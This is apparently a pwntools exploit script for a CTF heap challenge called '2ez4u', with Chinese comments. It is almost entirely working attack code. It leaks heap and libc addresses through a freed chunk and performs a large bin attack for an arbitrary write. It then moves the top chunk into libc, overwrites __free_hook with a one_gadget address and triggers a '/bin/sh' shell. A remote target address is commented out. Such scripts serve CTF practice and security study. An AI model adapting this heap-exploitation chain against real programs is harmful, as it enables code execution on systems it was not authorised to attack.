#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import c_uint32
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86-64'
context.os = 'linux'
context.log_level = 'DEBUG'
# io = remote("111.231.13.27", 20001)
#io = process("./chall", env = {"LD_PRELOAD" : "./libc-2.23.so"})
io = process("./2ez4u")
r = io
EXEC = 0x0000555555554000
def attach_and_debug():
    print(str(r.proc.pid))
    gdb.attach(r, """
echo heap\\n
x/30gx 0x0202040+0x555555554000
p/x main_arena->top
bins
    """);
    print(str(r.proc.pid))

    r.interactive()
def add(l, desc):
    io.recvuntil('your choice:')
    io.sendline('1')
    io.recvuntil('color?(0:red, 1:green):')
    io.sendline('1')
    io.recvuntil('value?(0-999):')
    io.sendline('1')
    io.recvuntil('num?(0-16)')
    io.sendline('1')
    io.recvuntil('description length?(1-1024):')
    io.sendline(str(l))
    io.recvuntil('description of the apple:')
    io.sendline(desc)
    pass
def dele(idx):
    io.recvuntil('your choice:')
    io.sendline('2')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))
    pass
def edit(idx, desc):
    io.recvuntil('your choice:')
    io.sendline('3')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))
    io.recvuntil('color?(0:red, 1:green):')
    io.sendline('2')
    io.recvuntil('value?(0-999):')
    io.sendline('1000')
    io.recvuntil('num?(0-16)')
    io.sendline('17')
    io.recvuntil('new description of the apple:')
    io.sendline(desc)
    pass
def show(idx):
    io.recvuntil('your choice:')
    io.sendline('4')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))
    pass
add(0x60,  '0'*0x60 ) #  0
add(0x60,  '1'*0x60 ) # 1
add(0x60,  '2'*0x60 ) #2
add(0x60,  '3'*0x60 ) #3 0x555555757190
add(0x60,  '4'*0x60 ) #4
add(0x60,  '5'*0x60 ) #5
add(0x60,  '6'*0x60 ) #6
add(0x3f0, '7'*0x3f0) #7 playground
add(0x30,  '8'*0x30 ) #8
add(0x3e0, '9'*0x3d0) #9 sup
add(0x30,  'a'*0x30 ) #10
add(0x3f0, 'b'*0x3e0) #11 victim 0x555555757c30
add(0x30,  'c'*0x30 )
# 0x555555756040: 0x0000006000000001      0x0000555555757010 0 x 0x00005555557580a0
# 0x555555756050: 0x0000006000000001      0x0000555555757090 1
# 0x555555756060: 0x0000006000000001      0x0000555555757110 2
# 0x555555756070: 0x0000006000000001      0x0000555555757190 3
# 0x555555756080: 0x0000006000000001      0x0000555555757210 4
# 0x555555756090: 0x0000006000000001      0x0000555555757290 5
# 0x5555557560a0: 0x0000006000000001      0x0000555555757310 6
# 0x5555557560b0: 0x000003f000000001      0x0000555555757390 7
# 0x5555557560c0: 0x0000003000000001      0x00005555557577a0 8
# 0x5555557560d0: 0x000003e000000001      0x00005555557577f0 9 x
# 0x5555557560e0: 0x0000003000000001      0x0000555555757bf0 a
# 0x5555557560f0: 0x000003f000000001      0x0000555555757c40 b x
# 0x555555756100: 0x0000003000000001      0x0000555555758050 c
# 0x555555756110: 0x0000000000000000      0x0000000000000000 d
# 0x555555756120: 0x0000000000000000      0x0000000000000000 e

# attach_and_debug()
dele(0x9)
dele(0xb)
dele(0x0)
#gdb.attach(io, execute='b *0x%x' % (EXEC+0x1247))
add(0x400, '0'*0x400) # 0 0x00005555557580a0
# attach_and_debug()
# leak
show(0xb)
io.recvuntil('num: ')
print hex(c_uint32(int(io.recvline()[:-1])).value)
io.recvuntil('description:')
HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0
log.info("heap base 0x%016x" % HEAP) # 0x555555757000
target_addr = HEAP+0xb0     # 1 0x5555557570b0 1的内容中
chunk1_addr = HEAP+0x130    # 2 0x555555757130 2的内容中
chunk2_addr = HEAP+0x1b0    # 3 0x5555557571b0 3的内容中
victim_addr = HEAP+0xc30    # b 0x555555757c30 真的b
# large bin attack
# print()
edit(0xb, p64(chunk1_addr))             # victim   bk_nextsize 0x0000555555757c40(free)
attach_and_debug()
edit(0x1, p64(0x0)+p64(chunk1_addr))    # target 不知道有啥用 0x0000555555757090
chunk2  = p64(0x0)
chunk2 += p64(0x0)
chunk2 += p64(0x421)
chunk2 += p64(0x0)
chunk2 += p64(0x0)
chunk2 += p64(chunk1_addr)
edit(0x3, chunk2) # chunk2  0x0000555555757190

chunk1  = ''
chunk1 += p64(0x0)
chunk1 += p64(0x0)
chunk1 += p64(0x411)
chunk1 += p64(target_addr-0x18)
chunk1 += p64(target_addr-0x10)
chunk1 += p64(victim_addr)
chunk1 += p64(chunk2_addr)
edit(0x2, chunk1) # chunk1 0x0000555555757110
edit(0x7, '7'*0x198+p64(0x410)+p64(0x411))
dele(0x6)
dele(0x3)
attach_and_debug()
add(0x3f0, '3'*0x30+p64(0xdeadbeefdeadbeef)) # 3 chunk1, arbitrary write !!!!!!! 这里是顺着large bin找，结果写入了fake chunk(0x0000555555757130)
# deadbeef盖住了3的size
add(0x60,  '6'*0x60 ) # 6
# 这里top还在堆上
# attach_and_debug()
show(0x3)
io.recvuntil('3'*0x30)
io.recv(8)
LIBC = u64(io.recv(6)+'\x00\x00')-0x3c4be8
log.info("libc base 0x%016x" % LIBC)
junk  = ''
junk += '3'*0x30
junk += p64(0x81)
junk += p64(LIBC+0x3c4be8)
junk += p64(HEAP+0x300)
junk  = junk.ljust(0xa8, 'A')
junk += p64(0x80)
recovery  = ''
recovery += junk
recovery += p64(0x80) # 0x4->size
recovery += p64(0x60) # 0x4->fd
dele(0x5)
dele(0x4)
edit(0x3, recovery) # victim, start from HEAP+0x158

# 这里top还在堆上
add(0x60,  '4'*0x60 ) # 
recovery  = ''
recovery += junk
recovery += p64(0x70) # 0x4->size
recovery += p64(0x0) # 0x4->fd
edit(0x3, recovery) # victim, start from HEAP+0x158
add(0x40,  '5'*0x30 ) 
dele(0x5)
# 这里top还在堆上

recovery  = ''
recovery += '3'*0x30
recovery += p64(0x61)
recovery += p64(LIBC+0x3c4b50) # main_arena+48??这里是改写了fastbin的fd，但为什么要改成这个值呢，怎么考虑的呢？？
edit(0x3, recovery) # victim, start from HEAP+0x158
attach_and_debug()
add(0x40,  '5'*0x30 ) # 
add(0x40,  p64(LIBC+0x3c5c50)) # 9(0x00007ffff7dd1b60)!!!这里把top搞到libc中;这里top的地址被提前写在数据
# recovery
edit(0xb, p64(HEAP+0x7e0))
dele(0x6)
# attach_and_debug()
add(0x300, '\x00') # 
add(0x300, '\x00') # 
add(0x300, '\x00') # 
add(0x300, '\x00') # 14
add(0x300, '/bin/sh') # 15
dele(0x1)
#add(0x300, '\x00'*0x1d0+p64(LIBC+0x45390)) # 
# 此时 top=0x7ffff7dd35b0,已经落到libc中，再申请就可以覆盖关键数据
add(0x300, '\x00'*0x1d0+p64(LIBC+0x4526a)) # 1 (0x00007ffff7dd35c0) <__free_hook> do_system+1098 往__free_hook(0x7ffff7dd37a8)里面写system
#gdb.attach(io, execute='b *0x%x' % (EXEC+0x1247))
dele(15) # trig system("/bin/sh")
io.interactive()